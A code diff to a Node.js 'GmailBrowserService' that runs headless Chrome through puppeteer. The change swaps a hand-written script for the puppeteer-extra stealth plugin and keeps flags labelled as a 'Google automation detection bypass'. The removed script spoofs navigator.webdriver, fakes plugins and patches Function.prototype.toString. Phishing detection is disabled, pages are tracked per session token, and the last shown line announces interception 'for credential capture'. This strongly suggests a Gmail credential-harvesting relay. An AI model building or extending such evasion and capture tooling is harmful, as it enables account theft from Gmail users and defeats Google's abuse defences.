@@ -1,4 +1,5 @@
 const puppeteer = require('puppeteer');
+const stealth = require('puppeteer-extra-plugin-stealth');
 const { EventEmitter } = require('events');
 
 /**
@@ -15,11 +16,18 @@ class GmailBrowserService extends EventEmitter {
     this.pages = new Map(); // sessionToken -> page instance
     this.io = null; // Socket.IO instance
     this.serviceStartTime = Date.now(); // Track service start time for health checks
+    
+    // Configure stealth plugin with specific evasions disabled
+    this.stealthPlugin = stealth();
+    this.stealthPlugin.enabledEvasions.delete('iframe.contentWindow');
+    this.stealthPlugin.enabledEvasions.delete('media.codecs');
+    
     this.browserOptions = {
       headless: true, // Use simple headless mode instead of 'new'
       devtools: false,
       defaultViewport: null, // Let browser use its default viewport
       args: [
+        '--disable-blink-features=AutomationControlled',
         '--no-sandbox',
         '--disable-setuid-sandbox',
         '--disable-dev-shm-usage',
@@ -39,13 +47,10 @@ class GmailBrowserService extends EventEmitter {
         '--no-first-run',
         '--disable-default-apps',
         '--disable-sync',
-        // Google automation detection bypass
-        '--disable-blink-features=AutomationControlled',
         '--disable-automation',
         '--disable-infobars',
         '--disable-browser-side-navigation',
         '--disable-features=TranslateUI',
-        '--disable-features=VizDisplayCompositor',
         '--exclude-switches=enable-automation',
         '--exclude-switches=enable-logging',
         '--no-default-browser-check',
@@ -53,7 +58,6 @@ class GmailBrowserService extends EventEmitter {
         '--disable-component-update',
         '--disable-background-networking',
         '--disable-client-side-phishing-detection',
-        '--disable-sync',
         '--metrics-recording-only',
         '--no-report-upload',
         '--disable-crash-reporter'
@@ -93,20 +97,26 @@ class GmailBrowserService extends EventEmitter {
         ignoreDefaultArgs: ['--enable-automation', '--enable-blink-features=AutomationControlled'],
       };
 
-      // Launch browser with enhanced error handling
+      // Launch browser with enhanced error handling and stealth plugin
       let browser;
       try {
-        console.log(`🚀 Launching browser with options:`, { headless: browserOptions.headless, args: browserOptions.args.slice(0, 5) });
-        browser = await puppeteer.launch(browserOptions);
-        console.log(`✅ Browser launched successfully`);
+        console.log(`🚀 Launching browser with stealth plugin and options:`, { headless: browserOptions.headless, args: browserOptions.args.slice(0, 5) });
+        
+        // Use puppeteer-extra with stealth plugin
+        const puppeteerExtra = require('puppeteer-extra');
+        puppeteerExtra.use(this.stealthPlugin);
+        
+        browser = await puppeteerExtra.launch(browserOptions);
+        console.log(`✅ Browser launched successfully with stealth plugin`);
       } catch (launchError) {
         console.error('First browser launch failed, trying minimal config:', launchError.message);
         
-        // Ultra-minimal fallback configuration
+        // Ultra-minimal fallback configuration without stealth
         const minimalOptions = {
           headless: true,
           defaultViewport: null,
           args: [
+            '--disable-blink-features=AutomationControlled',
             '--no-sandbox',
             '--disable-setuid-sandbox',
             '--disable-dev-shm-usage',
@@ -147,54 +157,6 @@ class GmailBrowserService extends EventEmitter {
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-User': '?1',
         'Sec-Fetch-Dest': 'document'
-      });
-
-      // Hide automation indicators with stealth script
-      await page.evaluateOnNewDocument(() => {
-        // Remove webdriver property
-        Object.defineProperty(navigator, 'webdriver', {
-          get: () => false,
-        });
-
-        // Mock chrome runtime
-        window.chrome = {
-          runtime: {},
-          loadTimes: function() {},
-          csi: function() {},
-        };
-
-        // Mock plugins
-        Object.defineProperty(navigator, 'plugins', {
-          get: () => [1, 2, 3, 4, 5],
-        });
-
-        // Mock languages
-        Object.defineProperty(navigator, 'languages', {
-          get: () => ['en-US', 'en'],
-        });
-
-        // Mock permissions
-        const originalQuery = window.navigator.permissions.query;
-        window.navigator.permissions.query = (parameters) => (
-          parameters.name === 'notifications' ?
-            Promise.resolve({ state: Notification.permission }) :
-            originalQuery(parameters)
-        );
-
-        // Remove automation traces
-        const originalMethod = Object.getOwnPropertyDescriptor(Navigator.prototype, 'webdriver');
-        if (originalMethod) {
-          delete Navigator.prototype.webdriver;
-        }
-
-        // Override toString for automation detection
-        const modifiedToString = Function.prototype.toString;
-        Function.prototype.toString = function() {
-          if (this === navigator.webdriver) {
-            return 'function webdriver() { [native code] }';
-          }
-          return modifiedToString.call(this);
-        };
       });
 
       // Enable request/response interception for credential capture
